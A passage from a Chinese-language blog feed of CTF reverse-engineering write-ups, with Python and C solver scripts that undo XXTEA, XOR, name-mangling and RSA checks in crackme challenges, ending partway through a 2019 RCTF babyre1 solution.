        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="XX"><a href="#XX" class="headerlink" title="XX"></a>XX</h2><p> <a href="https://en.wikipedia.org/wiki/XXTEA">https://en.wikipedia.org/wiki/XXTEA</a> XXTEA加密</p><p>输入前四位应为小写字母+数字, 取前四位为key, 后面补\x00, 补足16位</p><p>之后对flag进行XXTEA加密, 然后按2 0 3 1 的顺序混淆错位, 再谜之异或, 最后和</p><p> 0x6B40BCCE, 0xC0953A7C, 0x20209BEF, 0x3502F791, 0xC8021823, 0xFA5656E7进行对比.。</p><p>求异或:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> cipherX[] = &#123; <span class="number">0xCE</span>, <span class="number">0xBC</span>, <span class="number">0x40</span>, <span class="number">0x6B</span>, <span class="number">0x7C</span>, <span class="number">0x3A</span>, <span class="number">0x95</span>, <span class="number">0xC0</span>, <span class="number">0xEF</span>, <span class="number">0x9B</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x91</span>, <span class="number">0xF7</span>, <span class="number">0x02</span>, <span class="number">0x35</span>, <span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0xC8</span>, <span class="number">0xE7</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0xFA</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *v21 = cipherX + <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">int</span> v20 = <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">int</span> v22;</span><br><span class="line">    <span class="keyword">char</span> v23;</span><br><span class="line">    <span class="keyword">for</span> (; v20 &gt; <span class="number">0</span>; --v21) &#123;</span><br><span class="line">        v22 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v20 / <span class="number">3</span> &gt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v23 = *v21;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">              &#123;</span><br><span class="line">                    v23 ^= cipherX[v22++];</span><br><span class="line">                    *v21 = v23;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( v22 &lt; v20 / <span class="number">3</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        --v20;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x, &quot;</span>, cipherX[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题脚本, flag格式猜测key为flag, python3:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher, key</span>):</span></span><br><span class="line">        k = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            tmp = c_uint32(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                tmp.value = tmp.value &lt;&lt; <span class="number">8</span></span><br><span class="line">                tmp.value = tmp.value + key[<span class="number">4</span> * i + (<span class="number">3</span> - j)]</span><br><span class="line">            k[i] = tmp</span><br><span class="line">        length = <span class="built_in">len</span>(cipher)</span><br><span class="line">        n = length // <span class="number">4</span></span><br><span class="line">        v = [c_uint32()]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            tmp = c_uint32(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                tmp.value = tmp.value &lt;&lt; <span class="number">8</span></span><br><span class="line">                tmp.value = tmp.value + cipher[<span class="number">4</span> * i + (<span class="number">3</span> - j)]</span><br><span class="line">            v[i] = tmp</span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">        z = c_uint32(<span class="number">0</span>)</span><br><span class="line">        y = c_uint32(v[<span class="number">0</span>].value)</span><br><span class="line">        delta = c_uint32(<span class="number">0x9e3779b9</span>)</span><br><span class="line">        sum_delta = c_uint32(q * delta.value)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(q)[::-<span class="number">1</span>]:</span><br><span class="line">            e = (sum_delta.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n)[::-<span class="number">1</span>]:</span><br><span class="line">                z.value = v[p-<span class="number">1</span>].value</span><br><span class="line">                v[p].value -=  ((z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value&lt;&lt;<span class="number">4</span>)) ^ ((sum_delta.value ^ y.value) + (k[(p&amp;<span class="number">3</span>)^e].value ^ z.value))</span><br><span class="line">                y.value = v[p].value</span><br><span class="line">            z.value = v[n-<span class="number">1</span>].value</span><br><span class="line">            v[<span class="number">0</span>].value -= ((z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value&lt;&lt;<span class="number">4</span>)) ^ ((sum_delta.value ^ y.value) + (k[(<span class="number">0</span>&amp;<span class="number">3</span>)^e].value ^ z.value))</span><br><span class="line">            y.value = v[<span class="number">0</span>].value</span><br><span class="line">            sum_delta.value -= delta.value</span><br><span class="line">        plain = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                plain+=<span class="built_in">bytes</span>([v[i].value&amp;<span class="number">0xff</span>])</span><br><span class="line">                v[i].value = v[i].value &gt;&gt; <span class="number">8</span></span><br><span class="line">        <span class="keyword">return</span> plain</span><br><span class="line"><span class="comment"># cipherX = [ 0xCE, 0xBC, 0x40, 0x6B, 0x7C, 0x3A, 0x95, 0xC0, 0xEF, 0x9B, 0x20, 0x20, 0x91, 0xF7, 0x02, 0x35, 0x23, 0x18, 0x02, 0xC8, 0xE7, 0x56, 0x56, 0xFA] print(len(cipherX))</span></span><br><span class="line">cipherX = [<span class="number">0xce</span>, <span class="number">0xbc</span>, <span class="number">0x40</span>, <span class="number">0xa5</span>, <span class="number">0xb2</span>, <span class="number">0xf4</span>, <span class="number">0xe7</span>, <span class="number">0xb2</span>, <span class="number">0x9d</span>, <span class="number">0xa9</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0xc8</span>, <span class="number">0xae</span>, <span class="number">0x5b</span>, <span class="number">0x10</span>, <span class="number">0x6</span>, <span class="number">0x3d</span>, <span class="number">0x1d</span>, <span class="number">0xd7</span>, <span class="number">0xf8</span>, <span class="number">0xdc</span>, <span class="number">0xdc</span>, <span class="number">0x70</span>]</span><br><span class="line">cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    cipher[i * <span class="number">4</span> + <span class="number">2</span>] = cipherX[i * <span class="number">4</span> + <span class="number">0</span>]</span><br><span class="line">    cipher[i * <span class="number">4</span> + <span class="number">0</span>] = cipherX[i * <span class="number">4</span> + <span class="number">1</span>]</span><br><span class="line">    cipher[i * <span class="number">4</span> + <span class="number">3</span>] = cipherX[i * <span class="number">4</span> + <span class="number">2</span>]</span><br><span class="line">    cipher[i * <span class="number">4</span> + <span class="number">1</span>] = cipherX[i * <span class="number">4</span> + <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">cipher_b = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    cipher_b += <span class="built_in">bytes</span>([i])</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    key += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">plain = decrypt(cipher_b, key)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>, plain)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="easyRE"><a href="#easyRE" class="headerlink" title="easyRE"></a>easyRE</h2><p>出题挖了坑, 实际逻辑在fini里, 参考 <a href="https://luomuxiaoxiao.com/?p=516">https://luomuxiaoxiao.com/?p=516</a></p><p>主逻辑就是个异或加密, 根据提示知道异或key是flag</p><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x49</span> , <span class="number">0x6F</span> , <span class="number">0x64</span> , <span class="number">0x6C</span> , <span class="number">0x3E</span> , <span class="number">0x51</span> , <span class="number">0x6E</span> , <span class="number">0x62</span> , <span class="number">0x28</span> , <span class="number">0x6F</span> , <span class="number">0x63</span> , <span class="number">0x79</span> , <span class="number">0x7F</span> , <span class="number">0x79</span> , <span class="number">0x2E</span> , <span class="number">0x69</span> , <span class="number">0x7F</span> , <span class="number">0x64</span> , <span class="number">0x60</span> , <span class="number">0x33</span> , <span class="number">0x77</span> , <span class="number">0x7D</span> , <span class="number">0x77</span> , <span class="number">0x65</span> , <span class="number">0x6B</span> , <span class="number">0x39</span> , <span class="number">0x7B</span> , <span class="number">0x69</span> , <span class="number">0x79</span> , <span class="number">0x3D</span> , <span class="number">0x7E</span> , <span class="number">0x79</span> , <span class="number">0x4C</span> , <span class="number">0x40</span> , <span class="number">0x45</span> , <span class="number">0x43</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    s[i] ^= i</span><br><span class="line">    <span class="built_in">input</span> += <span class="built_in">chr</span>(s[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># input = &quot;Info:The first four chars are `flag`&quot;</span></span><br><span class="line"></span><br><span class="line">cipher = [  <span class="number">0x40</span>, <span class="number">0x35</span>, <span class="number">0x20</span>, <span class="number">0x56</span>, <span class="number">0x5D</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x45</span>, <span class="number">0x17</span>, <span class="number">0x2F</span>,  <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x62</span>, <span class="number">0x3C</span>, <span class="number">0x27</span>, <span class="number">0x54</span>, <span class="number">0x48</span>, <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>,  <span class="number">0x72</span>, <span class="number">0x3C</span>, <span class="number">0x32</span>, <span class="number">0x45</span>, <span class="number">0x5B</span>]</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line"></span><br><span class="line">xor = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="string">&quot;flag&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    key.append(cipher[i] ^ xor[i])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(cipher[i] ^ key[i % <span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="childRE"><a href="#childRE" class="headerlink" title="childRE"></a>childRE</h2><p>先把输入当成满二叉树然后后序遍历再输出进行打乱, 然后UnDecorate, 然后置换加密进行对比</p><p>爆破UnDecorate之后的内容, 然后进行还原得到</p><p><code>private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)</code></p><p>根据维基百科 <a href="https://en.wikipedia.org/wiki/Name_mangling">https://en.wikipedia.org/wiki/Name_mangling</a> 进行</p><p>Decorate, 然后还原打乱再进行md5得flag</p><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># cmp1 = &quot;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&quot;</span></span><br><span class="line"><span class="comment"># cmp2 = &quot;55565653255552225565565555243466334653663544426565555525555222&quot;</span></span><br><span class="line"><span class="comment"># table = [  0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30,#   0x2D, 0x3D, 0x21, 0x40, 0x23, 0x24, 0x25, 0x5E, 0x26, 0x2A,#   0x28, 0x29, 0x5F, 0x2B, 0x71, 0x77, 0x65, 0x72, 0x74, 0x79,#   0x75, 0x69, 0x6F, 0x70, 0x5B, 0x5D, 0x51, 0x57, 0x45, 0x52,#   0x54, 0x59, 0x55, 0x49, 0x4F, 0x50, 0x7B, 0x7D, 0x61, 0x73,#   0x64, 0x66, 0x67, 0x68, 0x6A, 0x6B, 0x6C, 0x3B, 0x27, 0x41,#   0x53, 0x44, 0x46, 0x47, 0x48, 0x4A, 0x4B, 0x4C, 0x3A, 0x22,#   0x5A, 0x58, 0x43, 0x56, 0x42, 0x4E, 0x4D, 0x3C, 0x3E, 0x3F,#   0x7A, 0x78, 0x63, 0x76, 0x62, 0x6E, 0x6D, 0x2C, 0x2E, 0x2F,#   0x00]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # for i in range(len(cmp1)):</span></span><br><span class="line"><span class="comment"># #     for j in range(len(table)):</span></span><br><span class="line"><span class="comment"># #         if ord(cmp1[i]) == table[j]:</span></span><br><span class="line"><span class="comment"># #             print hex(j)+&#x27;, &#x27;,</span></span><br><span class="line"><span class="comment"># # for i in range(len(cmp2)):</span></span><br><span class="line"><span class="comment"># #     for j in range(len(table)):</span></span><br><span class="line"><span class="comment"># #         if ord(cmp2[i]) == table[j]:</span></span><br><span class="line"><span class="comment"># #             print hex(j)+&#x27;, &#x27;,</span></span><br><span class="line"><span class="comment"># index1 = [0x14, 0x16, 0xd, 0x3, 0x5, 0x1, 0x9, 0xc, 0x9, 0x7, 0xc, 0x5, 0x16, 0x9, 0x13, 0x9, 0x3, 0x3, 0x1, 0xc, 0xd, 0x0, 0x7, 0x5, 0x10, 0x10, 0x9, 0xd, 0x2, 0xb, 0x5, 0x5, 0xc, 0xc, 0x8, 0x6, 0x3, 0x13, 0x2, 0x1, 0x2, 0x3, 0xb, 0x12, 0x9, 0x11, 0x2, 0x12, 0x0, 0xd, 0xb, 0x12, 0x9, 0x8, 0x9, 0x7, 0xc, 0x5, 0x16, 0x9, 0x13, 0x12]</span></span><br><span class="line"><span class="comment"># index2 = [0x4, 0x4, 0x4, 0x5, 0x4, 0x5, 0x4, 0x2, 0x1, 0x4, 0x4, 0x4, 0x4, 0x1, 0x1, 0x1, 0x4, 0x4, 0x5, 0x4, 0x4, 0x5, 0x4, 0x4, 0x4, 0x4, 0x1, 0x3, 0x2, 0x3, 0x5, 0x5, 0x2, 0x2, 0x3, 0x5, 0x4, 0x2, 0x5, 0x5, 0x2, 0x4, 0x3, 0x3, 0x3, 0x1, 0x5, 0x4, 0x5, 0x4, 0x4, 0x4, 0x4, 0x4, 0x1, 0x4, 0x4, 0x4, 0x4, 0x1, 0x1, 0x1]</span></span><br><span class="line"><span class="comment"># # print(len(index2))</span></span><br><span class="line"><span class="comment"># name = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for j in range(len(index1)):</span></span><br><span class="line"><span class="comment">#     for i in range(0x20, 0x7e):</span></span><br><span class="line"><span class="comment">#         if i % 23 == index1[j] and i // 23 == index2[j]:</span></span><br><span class="line"><span class="comment">#             name += chr(i)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment"># print name</span></span><br><span class="line"><span class="comment"># private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)</span></span><br><span class="line"><span class="comment"># ?表示模板</span></span><br><span class="line"><span class="comment"># * P</span></span><br><span class="line"><span class="comment"># char D; unsigned char E</span></span><br><span class="line"><span class="comment"># private near A</span></span><br><span class="line"><span class="comment"># 64位编程时, 唯一可用的调用协议的编码是A</span></span><br><span class="line"><span class="comment"># @: 形参表结束标志</span></span><br><span class="line"><span class="comment"># Z: 缺省的异常规范</span></span><br><span class="line"><span class="comment"># PAE unsiged char *</span></span><br><span class="line"><span class="comment"># PAD 返回类型</span></span><br><span class="line"><span class="comment"># A表示private的成员函数;A表示非只读成员函数;E表示thiscall</span></span><br><span class="line"><span class="comment"># ?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&quot;1234567890abcdefghijklmnopqrstu&quot;</span></span><br><span class="line">s2 = <span class="string">&quot;fg8hi94jk0lma52nobpqc6rsdtue731&quot;</span></span><br><span class="line">dic = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] == s2[j]:</span><br><span class="line">            dic.append(j)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print dic</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z&quot;</span></span><br><span class="line"><span class="built_in">input</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name)):</span><br><span class="line">    <span class="built_in">input</span> += name[dic[i]]</span><br><span class="line"><span class="comment"># print input</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">import</span> hashlib</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> md5(<span class="built_in">input</span>)</span><br></pre></td></tr></table></figure><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>C++写的 STL+VS 又开了Release</p><p>自己实现了大数算法, 输入三个数, 然后进行一波计算之后检查</p><p>三个数的大小排序为 p2 &lt; p1 &lt; p3</p><p>对算法进行化简, 发现就是42的三立方和问题</p><p>p1**3 + p2 ** 3 - p3 ** 3 == 42</p><p>直接百度答案进行排序</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1 == <span class="number">80435758145817515</span></span><br><span class="line">p2 == <span class="number">12602123297335631</span></span><br><span class="line">p3 == <span class="number">80538738812075974</span></span><br></pre></td></tr></table></figure><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>先玩了一波hhhh</p><p>在<code>.\Snake_Data\Plugins\</code>找到<code>Interface.dll</code>, 分析导出函数<code>GameObject</code></p><p>发现就是个RSA</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">v</span>):</span></span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> v != <span class="number">0</span>:</span><br><span class="line">        v, r = <span class="built_in">divmod</span>(v, <span class="number">255</span>)</span><br><span class="line">        s = <span class="built_in">chr</span>(r) + s</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">n = <span class="number">139907262641720884635250105449327463531131227516500497307311002094885245322386805049406878643982216326493527702414689439930090794753345844178528356178539094825247389836142928474607108262267087850211322640806135698076207986818086837911361480181444157057782599277473843153161174504240064610043962720953514451563</span></span><br><span class="line">c = <span class="number">79981856490856999850671700360733120831999995589421207460490185876531860518527597767905168099182891345123878966403548022646956365158864209467614850251731806682037300712511185681164865174187586907707195428804234739667769742078793162639867922056194688917569369338005327309973680573581158754297630654105882382426</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">100</span>):</span><br><span class="line">    r = <span class="built_in">pow</span>(c, i, n)</span><br><span class="line">    s = f(r)</span><br><span class="line">    <span class="keyword">if</span> s.startswith(<span class="string">&quot;flag&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
            <tag> XXTEA </tag>
            
            <tag> UnDecorate </tag>
            
            <tag> C++-re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 RCTF</title>
      <link href="/wp-games-2019rctf/"/>
      <url>/wp-games-2019rctf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>赛后复现, 学习学习！<br>嗯, 主办方很喜欢XXTEA呀0.0</p><h2 id="babyre1"><a href="#babyre1" class="headerlink" title="babyre1"></a>babyre1</h2><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/RCTF/babyre.zip">babyre1</a></p><p>运行:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input right flag you can got &#x27;Bingo!&#x27; :ssssss</span><br><span class="line">input is too short!</span><br></pre></td></tr></table></figure><p>IDA打开, 找到主函数:</p><p>分析得:输入密文, 长度为16, 范围0-9, a-z</p><p>之后用xxtea解密, 后进行CRC16_CCITT校验, 结果应该等于0x69E2。而后对解密后的前N位异或0x17, 根据提示, 最终应该得到Bingo!。</p><p>而xxtea解密中:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v11 = (<span class="keyword">unsigned</span> __int8)v8[v6 - <span class="number">1</span>];</span><br><span class="line">        v8[v6] = <span class="number">0</span>;</span><br><span class="line">        *v5 = v6;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; v11 &amp;&amp; v11 &lt;= <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = v6 - v11;</span><br><span class="line">          *v5 = v13;</span><br><span class="line">          v8[v13] = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">return</span> v8;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>根据解密的最后一个字节的大小N, 把明文倒数第N位用”\0”截断。</p><p>那么最后一个字节的大小就应该为2, 即最终应该为<code>“Bingo!xx\x02”</code>, xx未知, 而<code>Bingo！</code>应异或0x17.</p><p>可以通过提示:<code>MD5(rctf&#123;your answer&#125;) == 5f8243a662cf71bf31d2b2602638dc1d</code>爆破出来。</p><p>而我这里是靠猜的, 也不难猜, \x02很像加密时的padding, 所以猜测XXTEA解密后的明文应该为<code>“Bingo!\x02\x02”</code>(其中Bingo！应为异或0x17后的结果)</p><p>则解密脚本如下（XXTEA代码网上抄的0.0）:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="meta-string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode</span><span class="params">(<span class="keyword">char</span> *cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> chr1 = cipher[i] &gt;&gt; <span class="number">4</span> &amp; <span class="number">0xF</span>;</span><br><span class="line">        <span class="keyword">char</span> chr2 = cipher[i] &amp; <span class="number">0xF</span>;</span><br><span class="line">        <span class="keyword">if</span>(chr1 &lt; <span class="number">10</span>)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="keyword">char</span>(chr1 + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="keyword">char</span>(chr1 + <span class="number">0x61</span> - <span class="number">10</span>) ;</span><br><span class="line">        <span class="keyword">if</span> (chr2 &lt; <span class="number">10</span>)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="keyword">char</span>(chr2 + <span class="number">0x30</span>);</span><br><span class="line">        